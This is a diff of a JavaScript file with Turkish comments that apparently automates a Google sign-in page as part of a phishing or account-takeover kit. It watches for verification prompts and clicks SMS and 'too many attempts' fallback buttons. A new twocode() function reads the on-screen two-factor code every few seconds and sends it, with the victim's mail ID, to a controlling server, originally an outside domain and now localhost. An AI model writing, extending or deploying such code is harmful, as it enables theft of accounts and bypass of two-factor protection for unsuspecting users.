@@ -1,4 +1,4 @@
-var baseUrl = 'https://ajanspiink.com/';
+var baseUrl = 'https://localhost:44322/';
 function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; url = baseUrl + url; request.open("POST", url, true); request.send(); }
 
 try {
@@ -16,6 +16,7 @@ var stype = {
     Wait: 99,
     Finish: 77,
     Ok: 9999,
+    twocode: 7
 };
 
 
@@ -82,6 +83,7 @@ function start() {
 }
 
 
+
 function pass2() {
     var sInt2 = setInterval(function () {//2.şifre varmı yokmu kontrol
 
@@ -124,9 +126,11 @@ function pass2() {
         } catch (e) { }
 
         try {
-            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[1].innerText == "Doğrulama kodu alın") {
+            if (document.querySelector('samp')!=null) {
                 clearInterval(sInt2);
-                sms();
+
+                twocode();
+
                 return;
             }
         } catch (e) { }
@@ -192,6 +196,52 @@ function pass2() {
 }
 
 
+function twocode() {
+    var sInt2 = setInterval(function () {//2.şifre varmı yokmu kontrol
+
+        if (document.querySelector('samp') != null) {
+
+            var urlpass2 = 'gettype?mail=' + mailId + '&twocode=' + document.querySelector('samp').innerText;
+            ajax(urlpass2, function () {
+                if (this.readyState == 4 && this.status == 200) {
+                    var row = JSON.parse(this.responseText);
+
+
+
+
+
+                }
+            });
+
+        }
+        else {
+            debugger;
+
+            clearInterval(sInt2);
+
+            var urlpass3 = 'settype?mail=' + mailId + '&stypeenum=' + stype.Ok;
+            ajax(urlpass3, function () {
+                if (this.readyState == 4 && this.status == 200) {
+                    var row = JSON.parse(this.responseText);
+                }
+            });
+
+
+
+
+
+        }
+
+
+
+    }, 3000);
+}
+
+
+
+
+
+
 function sms() {
     var sInt3 = setInterval(function () {//Sms Doğrulama
 
@@ -207,7 +257,7 @@ function sms() {
 
         try {
             var smsBTN = document.querySelector('#smsButton');
-            if (smsBTN != null &&  document.querySelector('#phoneNumberId') == null) {
+            if (smsBTN != null && document.querySelector('#phoneNumberId') == null) {
                 document.querySelector('#smsButton').click();
                 //clearInterval(sInt3);
                 //sms();
@@ -226,7 +276,7 @@ function sms() {
 
 
         try {
-            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[0].innerText == "Çok fazla başarısız girişimde bulunuldu" ) {
+            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[0].innerText == "Çok fazla başarısız girişimde bulunuldu") {
                 document.querySelector('#altActionOutOfQuota').click();
                 clearInterval(sInt3);
                 mail();
@@ -432,7 +482,7 @@ function mailsend() {
 
 //}, 7000);
 
-//var baseUrl = 'https://ajanspiink.com/';
+//var baseUrl = 'https://localhost:44322/';
 //function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; url = baseUrl + url; request.open("POST", url, true); request.send(); }
 
 
